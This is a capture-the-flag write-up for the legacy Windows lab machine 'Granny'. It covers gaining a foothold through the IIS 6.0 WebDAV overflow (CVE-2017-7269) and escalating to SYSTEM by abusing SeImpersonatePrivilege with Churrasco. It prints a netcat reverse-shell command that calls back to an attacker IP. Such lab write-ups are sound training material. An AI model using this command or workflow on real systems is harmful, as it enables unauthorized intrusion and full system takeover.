# Granny

**Difficulty:** Easy | **OS:** Windows | **IP:** `10.129.95.234`

## Summary
**Granny** is an easy-difficulty legacy Windows target that shares many technical similarities with the Grandpa machine. It highlights the security risks associated with running unpatched, end-of-life web servers with HTTP WebDAV extension methods enabled. Initial access is achieved by identifying a known WebDAV buffer overflow flaw (CVE-2017-7269) in Microsoft IIS 6.0, granting initial command shell access under a service account context (`NT AUTHORITY\NETWORK SERVICE`). Privilege escalation to `NT AUTHORITY\SYSTEM` is performed by identifying enabled token impersonation rights (`SeImpersonatePrivilege`) and leveraging local primary token manipulation techniques (such as Churrasco) to execute commands as the system administrator.

## Reconnaissance

### Port Scanning (Nmap)
We begin by identifying open TCP ports and active service versions:

- **80**: HTTP (Microsoft IIS httpd 6.0)

### Service Enumeration
Interacting with the web server on port 80 confirms an unpatched instance of Microsoft IIS 6.0 running on Windows Server 2003. Further inspection of HTTP headers reveals that WebDAV options (such as `PROPFIND`, `PUT`, and `LOCK`) are enabled on the server root directory.

## Exploitation (Initial Access)

### WebDAV ScStoragePathFromUrl Buffer Overflow (CVE-2017-7269)
Microsoft IIS 6.0 with WebDAV enabled contains a critical buffer overflow vulnerability in the `ScStoragePathFromUrl` function within `httpext.dll`.

- **Vulnerability Mechanism:** A specially crafted, oversized header within a WebDAV `PROPFIND` request triggers a buffer overflow when the server parses storage paths, allowing arbitrary code execution within the context of the IIS worker process.
- **Execution:** Triggering the vulnerability yields initial shell access under the service account identity (`NT AUTHORITY\NETWORK SERVICE`).

## Privilege Escalation (Root Flag)

### System & Privilege Enumeration
Checking assigned account privileges via `whoami /priv`:

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

Checking `systeminfo` confirms the operating system environment:

- **OS Name:** Microsoft Windows Server 2003, Standard Edition
- **OS Version:** 5.2.3790 Service Pack 2 Build 3790

### Token Impersonation Abuse (SeImpersonatePrivilege)
The `SeImpersonatePrivilege` permission allows a process to impersonate security tokens belonging to other higher-privileged users (including `SYSTEM`) when services interact with local RPC/COM endpoints.

- **Vulnerability Mechanism:** On legacy Windows Server 2003 environments, tools like Churrasco (a local primary token impersonation utility) force a local service to authenticate to a rogue local pipe server, capturing and impersonating a `SYSTEM` token.
- **Privilege Escalation Workflow:**
  1) Transfer required binaries (`churrasco.exe` and a Netcat utility) to a writable directory on the target host (e.g., `C:\WINDOWS\Temp\`).
  2) Execute the impersonation binary to launch a new process context with elevated privileges:

     ```churrasco.exe -d "nc.exe -e cmd.exe 10.10.14.28 4444"```

Executing the command establishes an elevated reverse shell running as `NT AUTHORITY\SYSTEM`, granting full administrative control over the machine and enabling retrieval of both `user.txt` and `root.txt`.
